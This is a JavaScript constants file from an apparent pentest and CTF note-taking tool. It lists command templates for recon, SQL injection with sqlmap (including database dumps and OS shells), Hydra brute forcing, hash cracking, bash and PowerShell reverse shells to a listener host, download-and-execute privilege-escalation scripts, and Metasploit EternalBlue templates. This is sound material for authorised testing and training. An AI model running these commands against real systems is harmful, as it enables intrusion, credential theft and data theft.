// Shared constants for Helm's Paladin
// Extracted from app/page.js for reuse and maintainability

export const SUGGESTIONS = [
  {
    category: 'Network Recon',
    items: [
      { label: 'Nmap Fast', command: 'nmap -F {target}' },
      { label: 'Nmap Full Aggressive', command: 'nmap -A -p- -T4 {target}' },
      { label: 'UDP Scan', command: 'nmap -sU -T4 {target}' },
      { label: 'Whois Lookup', command: 'whois {target}' },
      { label: 'DNS Dig', command: 'dig {target} ANY' },
      { label: 'Ping Loop', command: 'ping -c 4 {target}' }
    ]
  },
  {
    category: 'Web Enumeration',
    items: [
      { label: 'WhatWeb', command: 'whatweb {target}' },
      { label: 'Gobuster Dir', command: 'gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt' },
      { label: 'FFUF Fuzz', command: 'ffuf -u http://{target}/FUZZ -w /usr/share/wordlists/dirb/common.txt' },
      { label: 'Curl Headers', command: 'curl -I http://{target}/' },
      { label: 'Curl Verbose', command: 'curl -v http://{target}/' },
      { label: 'Curl Pass Cookie', command: 'curl -b "session=123" http://{target}/' },
      { label: 'Curl Burp Proxy', command: 'curl -x http://localhost:8080 http://{target}/' }
    ]
  },
  {
    category: 'Windows/AD Recon',
    items: [
      { label: 'SMB Null Session', command: 'smbclient -L //{target} -N' },
      { label: 'Enum4Linux (sim)', command: 'smbclient -L //{target} -N' },
      { label: 'LDAP Search', command: 'ldapsearch -x -H ldap://{target} -b "dc=example,dc=com"' }
    ]
  },
  {
    category: 'Database SQLi',
    items: [
      { label: 'Auto Scan', command: 'sqlmap -u "http://{target}/" --batch' },
      { label: 'List Databases', command: 'sqlmap -u "http://{target}/" --dbs' },
      { label: 'Dump DB', command: 'sqlmap -u "http://{target}/" --dump-all --batch' },
      { label: 'OS Shell', command: 'sqlmap -u "http://{target}/" --os-shell' }
    ]
  },
  {
    category: 'Advanced Recon',
    items: [
      { label: 'DNS Std Scan', command: 'dnsrecon -d {target} -t std' },
      { label: 'SSL/TLS Scan', command: 'sslscan {target}' },
      { label: 'Traceroute', command: 'traceroute {target}' }
    ]
  },
  {
    category: 'Exploit Research',
    items: [
      { label: 'SearchSploit SMB', command: 'searchsploit smb' },
      { label: 'SearchSploit Apache', command: 'searchsploit apache 2.4' },
      { label: 'SearchSploit CVE', command: 'searchsploit CVE-2024-0000' },
      { label: 'SearchSploit Mirror', command: 'searchsploit -m 00000' },
      { label: 'Exploit-DB', command: 'Visit https://www.exploit-db.com' }
    ]
  },
  {
    category: 'Web Vulnerability Scanning',
    items: [
      { label: 'Nikto Scan', command: 'nikto -h http://{target}' },
      { label: 'Nikto HTTPS', command: 'nikto -h https://{target} -ssl' },
      { label: 'Nikto Full Tuning', command: 'nikto -h http://{target} -Tuning 9' },
      { label: 'Nikto Custom Port', command: 'nikto -h {target} -p 8080' },
      { label: 'Feroxbuster', command: 'feroxbuster -u http://{target} -w /usr/share/wordlists/dirb/common.txt' },
      { label: 'Feroxbuster PHP/HTML', command: 'feroxbuster -u http://{target} -x php,html,txt -w /usr/share/wordlists/dirb/common.txt' },
      { label: 'Feroxbuster No Recurse', command: 'feroxbuster -u http://{target} --no-recursion -w /usr/share/wordlists/dirb/common.txt' }
    ]
  },
  {
    category: 'Brute Force',
    items: [
      { label: 'Hydra SSH', command: 'hydra -l {user} -P /usr/share/wordlists/rockyou.txt ssh://{target}' },
      { label: 'Hydra FTP', command: 'hydra -l {user} -P /usr/share/wordlists/rockyou.txt ftp://{target}' },
      { label: 'Hydra HTTP POST', command: 'hydra -l {user} -P /usr/share/wordlists/rockyou.txt {target} http-post-form "/login:username=^USER^&password=^PASS^:Invalid"' },
      { label: 'Hydra RDP', command: 'hydra -l {user} -P /usr/share/wordlists/rockyou.txt rdp://{target}' },
      { label: 'Hydra SMB', command: 'hydra -l {user} -P /usr/share/wordlists/rockyou.txt smb://{target}' },
      { label: 'Medusa SSH', command: 'medusa -h {target} -u {user} -P /usr/share/wordlists/rockyou.txt -M ssh' },
      { label: 'CrackMapExec SMB', command: 'crackmapexec smb {target} -u {user} -p /usr/share/wordlists/rockyou.txt' }
    ]
  },
  {
    category: 'Hash Cracking',
    items: [
      { label: 'Hashcat Wordlist', command: 'hashcat -a 0 -m 0 {hashfile} /usr/share/wordlists/rockyou.txt' },
      { label: 'Hashcat NTLM', command: 'hashcat -a 0 -m 1000 {hashfile} /usr/share/wordlists/rockyou.txt' },
      { label: 'Hashcat Brute Force (MD5)', command: 'hashcat -a 3 -m 0 {hashfile} ?a?a?a?a?a?a' },
      { label: 'Hashcat Kerberos TGS', command: 'hashcat -a 0 -m 13100 {hashfile} /usr/share/wordlists/rockyou.txt' },
      { label: 'John Wordlist', command: 'john --wordlist=/usr/share/wordlists/rockyou.txt {hashfile}' },
      { label: 'John Auto', command: 'john {hashfile}' },
      { label: 'John Show Cracked', command: 'john --show {hashfile}' },
      { label: 'John SSH Key', command: 'ssh2john id_rsa > id_rsa.hash && john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash' },
      { label: 'John ZIP', command: 'zip2john {file}.zip > zip.hash && john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash' },
      { label: 'Identify Hash', command: 'hash-identifier {hash}' }
    ]
  },
  {
    category: 'Post-Exploitation',
    items: [
      { label: 'Reverse Shell Bash', command: 'bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"' },
      { label: 'Reverse Shell PowerShell', command: 'powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\\\"{lhost}\\\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \\\"PS \\\" + (pwd).Path + \\\"> \\\";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"' },
      { label: 'LinPEAS', command: 'curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh' },
      { label: 'WinPEAS', command: 'powershell -c \"iwr -UseBasicParsing https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -OutFile winpeas.exe\"' },
      { label: 'PowerUp', command: 'powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString(\\\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1\\\"); Invoke-AllChecks\"' }
    ]
  },
  {
    category: 'Metasploit Templates',
    items: [
      { label: 'msfconsole Search', command: 'msfconsole -q -x \"search type:exploit name:smb; exit\"' },
      { label: 'msfconsole Handler', command: 'msfconsole -q -x \"use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run\"' },
      { label: 'msfconsole SMB', command: 'msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; run\"' }
    ]
  }
];

export const DIFFICULTY_COLORS = { easy: '#3fb950', medium: '#d29922', hard: '#f85149' };

export const SIDEBAR_MIN_WIDTH = 260;
export const SIDEBAR_MAX_WIDTH = 420;
export const SIDEBAR_DEFAULT_WIDTH = 320;
export const SIDEBAR_RAIL_WIDTH = 72;

export const SUGGESTED_TAGS = [
  // Pentest stages (HackTheBox methodology)
  'pre-engagement', 'information-gathering', 'enumeration', 'vulnerability-assessment',
  'exploitation', 'post-exploitation', 'lateral-movement', 'proof-of-concept', 'post-engagement',
  // CTF categories
  'web', 'network', 'crypto', 'forensics', 'reverse-engineering', 'steganography',
  'privilege-escalation', 'password-cracking', 'finding', 'flag',
];
